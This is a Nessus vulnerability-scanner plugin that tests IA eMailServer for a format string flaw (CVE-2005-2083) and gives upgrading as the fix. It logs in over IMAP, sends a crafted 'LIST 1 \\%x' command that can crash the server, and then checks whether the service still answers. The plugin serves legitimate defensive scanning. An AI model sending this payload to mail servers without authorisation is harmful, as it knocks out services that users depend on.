#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description) {
  script_id(18570);
  script_version("$Revision: 1.15 $");

  script_cve_id("CVE-2005-2083");
  script_bugtraq_id(14065);
  script_osvdb_id(17609);

  script_name(english:"IA eMailServer IMAP4 LIST Command Format String Remote DoS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote mail server is affected by a format string vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running True North Software's IA eMailServer, a
messaging system for Windows. 

The remote version of IA eMailServer suffers from a format string
vulnerability leading to a denial of service that can be exploited by
an authenticated user when sending a specially crafted IMAP LIST
command." );
 script_set_attribute(attribute:"see_also", value:"http://lists.grok.org.uk/pipermail/full-disclosure/2005-June/034727.html" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to IA eMailServer 5.3.4 Build 2019 or greater." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:S/C:N/I:N/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2005/06/28");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/06/27");
 script_cvs_date("$Date: 2011/10/05 02:29:40 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 
  script_summary(english:"Checks for remote format string vulnerability in IA eMailServer");
  script_category(ACT_DENIAL);
  script_copyright(english:"This script is Copyright (C) 2005-2011 Tenable Network Security, Inc.");
  script_family(english:"Windows");
  script_dependencies("imap_overflow.nasl");
  script_require_keys("imap/login", "imap/password");
  script_exclude_keys("imap/false_imap", "imap/overflow");
  script_require_ports("Services/imap", 143);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("imap_func.inc");


port = get_service(svc:"imap", default: 143, exit_on_fail: 1);
if (get_kb_item("imap/"+port+"/false_imap")
 || get_kb_item("imap/"+port+"/overflow")) exit(0);
user = get_kb_item_or_exit("imap/login");
pass = get_kb_item_or_exit("imap/password");


# Establish a connection.
soc = open_sock_tcp(port);
if (soc) {
  tag = 0;
  s = recv_line(socket:soc, length:1024);

  # If it's IA eMailServer...
  if (strlen(s) && "True North Software IMAP4rev1" >< s) {
    # Try to log in.
    ++tag;
    c = string("a", string(tag), " LOGIN ", user, " ", pass);
    send(socket:soc, data:string(c, "\r\n"));
    while (s = recv_line(socket:soc, length:1024)) {
      s = chomp(s);
      m = eregmatch(pattern:string("^a", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
      if (!isnull(m)) {
        resp = m[1];
        break;
      }
      resp = "";
    }
    if (resp && resp =~ "NO") {
      debug_print("can't login with supplied IMAP credentials; skipped!");
    }
    else if (resp && resp =~ "OK") {
      # Try to exploit the flaw.
      ++tag;
      c = string("a", string(tag), " LIST 1 \\%x");
      send(socket:soc, data:string(c, "\r\n"));
      while (s = recv_line(socket:soc, length:1024)) {
        s = chomp(s);
        m = eregmatch(pattern:string("^a", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
        if (!isnull(m)) {
          resp = m[1];
          break;
        }
        resp = "";
      }

      # If we didn't get a response back...
      if (!strlen(s)) {
        sleep(1);
        # Try to reestablish a connection and read the banner.
        soc2 = open_sock_tcp(port);
        if (soc2) s2 = recv_line(socket:soc2, length:1024);

        # If we couldn't establish the connection or read the banner,
        # there's a problem.
        if (!soc2 || !strlen(s2)) {
          security_warning(port);
          exit(0);
        }
        close(soc2);
      }
    }
  }

  # Be nice and logout.
  ++tag;
  c = string("a", string(tag), " LOGOUT");
  send(socket:soc, data:string(c, "\r\n"));
  close(soc);
}
